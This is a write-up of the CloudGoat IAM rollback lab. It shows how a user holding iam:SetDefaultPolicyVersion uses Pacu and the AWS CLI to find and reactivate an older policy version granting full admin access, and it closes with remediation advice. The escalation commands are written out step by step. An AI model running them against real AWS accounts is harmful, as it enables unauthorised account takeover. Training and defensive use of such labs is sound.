---
title: "CloudGoat: IAM Privilege Escalation via Rollback"
---

# 🚀 CloudGoat - IAM Privilege Escalation via  ROLLBACK - `iam:SetDefaultPolicyVersion` (Rollback Attack)

## 📝 TL;DR

An IAM user with **`iam:SetDefaultPolicyVersion`** can escalate privileges by reverting a policy to a **previous version** that contains **over-permissive access** (e.g., `AdministratorAccess`).  
We identify such a version (`v3`), and simply run `set-default-policy-version` to take over the account.

---

We start with some credentials for an AWS IAM user. The keys have been redacted for obvious reasons:

```bash
aws configure --profile raynor
```

Once the credentials are set, I fire up Pacu to see what kind of access I have:

```jsx
Pacu (raynor:No Keys Set) > import_keys raynor
Imported keys as "imported-raynor"
```

Now time to enumerate:

```jsx
Pacu (raynor:imported-raynor) > run iam__enum_permissions
```

Then confirm identity and scope:

```jsx
Pacu (raynor:imported-raynor) > whoami
```

We're operating as an IAM user:

- **UserName:** `raynor-cgidum7opd03zq`
- **Account ID:** `727671863602`
- **Policy Attached:** `cg-raynor-policy-cgidum7opd03zq`

### ✅ We Have: `iam:SetDefaultPolicyVersion`

This single permission is a **golden ticket** for privilege escalation. Here’s why 👇

---

## 🔓 What is a Rollback Attack?

AWS IAM policies support **up to 5 versions**, but only **one version is active** at a time — the “default.”

If an older version contains **elevated permissions** (like `AdministratorAccess`), and still exists, we can simply **roll back** to it using:

```
iam:SetDefaultPolicyVersion
```

No need to create a new policy or edit anything — we just **activate** an older version.

---

## 🧠 Enumeration Phase

We dig deeper:

```jsx
Pacu > run iam__enum_users_roles_policies_groups
```

This returns:

- 4 Users
- 9 Roles
- 4 Policies
- 0 Groups

We use the AWS CLI to list policies:

```bash
aws iam list-policies --scope All --profile raynor
```

Locate the target:

```json
{
    "PolicyName": "cg-raynor-policy-cgidum7opd03zq",
    "Arn": "arn:aws:iam::727671863602:policy/cg-raynor-policy-cgidum7opd03zq",
    "DefaultVersionId": "v1",
    ...
}
```

Now we list the policy versions:

```bash
aws iam list-policy-versions --policy-arn arn:aws:iam::727671863602:policy/cg-raynor-policy-cgidum7opd03zq --profile raynor
```

We find 5 versions:

- **v1** (default) — Basic read-only + `SetDefaultPolicyVersion`
- **v2** — Full deny (unless coming from specific IPs)
- **v3** — ⭐ Full `Action: "*"` access (root-level access)
- **v4** — Conditional `iam:Get*` actions
- **v5** — Some S3 read permissions

---

## 🧨 The Escalation

The most permissive version is clearly `v3`, so we activate it:

```bash
aws iam set-default-policy-version   --policy-arn arn:aws:iam::727671863602:policy/cg-raynor-policy-cgidum7opd03zq   --version-id v3   --profile raynor
```

Boom 💥 — the IAM policy now grants **full admin access** to the account.

---

## ✅ Confirm the Rollback Worked

```bash
aws iam get-policy   --policy-arn arn:aws:iam::727671863602:policy/cg-raynor-policy-cgidum7opd03zq   --profile raynor
```

You should see:

```json
"DefaultVersionId": "v3"
```

That’s it. We’ve successfully escalated privileges in AWS by rolling back to a previously uploaded over-permissive policy using nothing more than `iam:SetDefaultPolicyVersion`.

---

## 🛡️ Remediation

- **Delete old IAM policy versions** that are no longer in use:
  ```bash
  aws iam delete-policy-version     --policy-arn <POLICY_ARN>     --version-id <VERSION_ID>
  ```

- **Restrict access** to `iam:SetDefaultPolicyVersion` to only trusted admin roles.

- **Enable CloudTrail monitoring** and create alerts for:
  - `iam:SetDefaultPolicyVersion`
  - `iam:CreatePolicyVersion`

- Consider **automated detection** for policies that contain:
  - `Action: "*"`
  - `Resource: "*"`
  - or any **inline policies** with overly broad permissions.

- Implement **least privilege** across all IAM roles and users — revisit periodically.
